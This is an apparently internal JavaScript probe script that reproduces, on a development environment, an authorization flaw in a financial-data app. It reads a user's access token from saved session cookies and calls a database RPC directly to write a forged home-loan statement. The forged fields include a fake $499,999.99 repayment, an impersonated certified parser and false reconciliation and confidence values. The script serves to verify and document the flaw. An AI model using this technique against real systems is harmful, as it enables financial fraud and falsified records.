/**
 * R20 live-DEV forge probe #2 (feature/canonical-cert-final-timing-and-r20-scope).
 *
 * Reproduces, live on DEV, the 0218-disclosed residual gap: fdh10_persist_liability_statement
 * is SECURITY INVOKER, granted to `authenticated`, and its only preconditions are
 * (a) the caller owns a fdh_statement_uploads row whose processing_status = 'queued', and
 * (b) no fdh_liability_statements row exists yet for that document.
 * It does NOT check the document's document_type/source_type at all. So ANY freshly
 * uploaded document (even an ordinary bank-CSV upload, never touched by /detect or
 * /process) is a valid "carrier" for a hand-crafted liability-statement RPC call that
 * writes fabricated evidence numbers -- including parser_name/parser_version/
 * extraction_confidence/reconciliation_status, i.e. it can make forged data LOOK
 * machine-extracted by the certified parser at a stated confidence.
 *
 * Uses ONLY the fixture user's own access token (never the service role) for the
 * upload and the RPC call. Uses the service role ONLY to OBSERVE the resulting rows
 * (read-only) so the report can state exactly what landed. Cleans nothing up itself --
 * the caller must run residue.mjs cleanup afterwards (the row is intentionally left
 * for the PO's own inspection until then).
 */
import fs from 'node:fs';
import path from 'node:path';
import { loadDevEnv, serviceClient } from '../lib/env.mjs';
import { api } from '../lib/session.mjs';

const args = process.argv.slice(2);
const arg = (k) => { const i = args.indexOf(k); return i >= 0 ? args[i + 1] : undefined; };
const email = arg('--email');
const port = Number(arg('--port'));
if (!email || !port) throw new Error('usage: r20_liability_forge_probe.mjs --email e --port p');

function loadAccessToken(email) {
  const file = path.resolve('.canonical-cert', `session-${email.replace(/[^a-z0-9._-]/gi, '_')}.json`);
  const session = JSON.parse(fs.readFileSync(file, 'utf8'));
  const cookieName = Object.keys(session.cookies).find((k) => k.startsWith('sb-') && k.endsWith('-auth-token'));
  let raw = session.cookies[cookieName];
  if (raw.startsWith('base64-')) raw = Buffer.from(raw.slice('base64-'.length), 'base64').toString('utf8');
  const parsed = JSON.parse(raw);
  const token = Array.isArray(parsed) ? parsed[0] : parsed.access_token;
  const userId = session.userId;
  if (!token) throw new Error('could not extract access_token from session cookie');
  return { token, userId };
}

async function restRpc(fn, { anonKey, url, token, body }) {
  const res = await fetch(`${url}/rest/v1/rpc/${fn}`, {
    method: 'POST',
    headers: { apikey: anonKey, Authorization: `Bearer ${token}`, 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  });
  const text = await res.text();
  let json = null; try { json = JSON.parse(text); } catch { /* not json */ }
  return { status: res.status, json, text };
}

async function main() {
  const { url, anonKey } = loadDevEnv();
  const { token, userId } = loadAccessToken(email);
  const results = { email, userId };

  // 1) Upload a TRIVIAL, otherwise-unremarkable bank CSV through the REAL app route.
  //    This is upload-only (no /detect, no /process yet), so the document is left at
  //    processing_status = 'queued' -- ordinary, legitimate behaviour with NOTHING
  //    suspicious about it yet.
  let documentId = arg('--document-id');
  if (documentId) {
    console.log(`reusing existing document ${documentId} (skipping upload)`);
    results.upload = { reused: documentId };
  } else {
    const csv = `Date,Description,Amount\n2026-08-01,OPENING BALANCE ${Date.now()},0.00\n`;
    const uploadRes = await api(email, 'POST', '/api/financial-data-hub/bank-csv/upload?country_code=AU&currency_code=AUD&filename=forge_probe.csv', {
      port,
      body: csv,
      contentType: 'text/csv',
    });
    results.upload = { status: uploadRes.status, body: uploadRes.json ?? uploadRes.text.slice(0, 500) };
    console.log('POST /api/financial-data-hub/bank-csv/upload ->', uploadRes.status, uploadRes.text.slice(0, 400));
    documentId = uploadRes.json?.data?.document_id ?? uploadRes.json?.data?.document?.id ?? uploadRes.json?.data?.id;
  }
  if (!documentId) {
    console.log('no document id returned; stopping.');
  } else {
    results.documentId = documentId;

    // Observe (service role, READ ONLY) that it really is an ordinary queued bank-csv doc.
    const svc = await serviceClient();
    const { data: before } = await svc.from('fdh_statement_uploads').select('id, document_type, source_type, processing_status').eq('id', documentId).maybeSingle();
    results.documentBefore = before;
    console.log('document before forge (service-role read-only observe):', JSON.stringify(before));

    // 2) Hand-craft the RPC call directly against PostgREST, as the authenticated user,
    //    bypassing the app entirely for this step -- exactly what a malicious user's own
    //    curl/fetch with their own JWT would send. NEVER touches /process for this doc.
    const forgedStatement = {
      statement_type: 'loan',
      facility_type: 'home_loan',
      country_code: 'AU',
      currency_code: 'AUD',
      institution_name: 'FHIP Certified Test Bank',
      masked_identifier: 'xxxx1234',
      statement_period_start: '2026-08-01',
      statement_period_end: '2026-08-31',
      statement_date: '2026-08-31',
      opening_balance: 500000.00,
      closing_balance: 0.01, // implies a $499,999.99 principal reduction that never happened
      opening_principal: 500000.00,
      closing_principal: 0.01,
      interest_rate: 0.01,
      interest_total: 0.01,
      fees_total: 0,
      payments_total: 499999.99,
      principal_repayments_total: 499999.99,
      reconciliation_status: 'reconciled', // claims a clean reconciliation that never ran
      reconciliation_variance: 0,
      parser_name: 'fhip-certified-home-loan-parser', // impersonates a real certified parser
      parser_version: '9.9.9',
      extraction_confidence: 0.99, // claims high machine confidence for hand-typed numbers
      review_status: 'not_required', // claims no review is needed
    };
    const forgedActivities = [
      {
        activity_type: 'PRINCIPAL',
        activity_date: '2026-08-15',
        amount: 499999.99,
        currency_code: 'AUD',
        description_raw: 'FORGED principal repayment -- never happened',
        principal_component: 499999.99,
        interest_component: 0,
        fee_component: 0,
        source_row_number: 1,
      },
    ];
    const rpcRes = await restRpc('fdh10_persist_liability_statement', {
      anonKey, url, token,
      body: { p_statement_upload_id: documentId, p_statement: forgedStatement, p_activities: forgedActivities },
    });
    results.forgeRpc = { status: rpcRes.status, body: rpcRes.json ?? rpcRes.text.slice(0, 800) };
    console.log('RPC fdh10_persist_liability_statement (hand-crafted) ->', rpcRes.status, JSON.stringify(rpcRes.json ?? rpcRes.text.slice(0, 500)));

    // 3) Observe (service role, READ ONLY) exactly what landed.
    const { data: docAfter } = await svc.from('fdh_statement_uploads').select('id, document_type, source_type, processing_status, error_code').eq('id', documentId).maybeSingle();
    results.documentAfter = docAfter;
    const statementId = rpcRes.json?.statement_id;
    if (statementId) {
      const { data: stmt } = await svc.from('fdh_liability_statements').select('*').eq('id', statementId).maybeSingle();
      results.forgedStatementRow = stmt;
      const { data: acts } = await svc.from('fdh_liability_statement_activities').select('*').eq('statement_id', statementId);
      results.forgedActivityRows = acts;
      console.log('forged fdh_liability_statements row (service-role read-only observe):', JSON.stringify(stmt, null, 1));
    }
  }

  const outFile = path.resolve('.canonical-cert', 'final', 'r20-liability-forge-probe.json');
  fs.mkdirSync(path.dirname(outFile), { recursive: true });
  fs.writeFileSync(outFile, JSON.stringify(results, null, 2));
  console.log(`wrote ${outFile}`);
}
main().catch((e) => { console.error(e instanceof Error ? e.stack : e); process.exitCode = 1; });
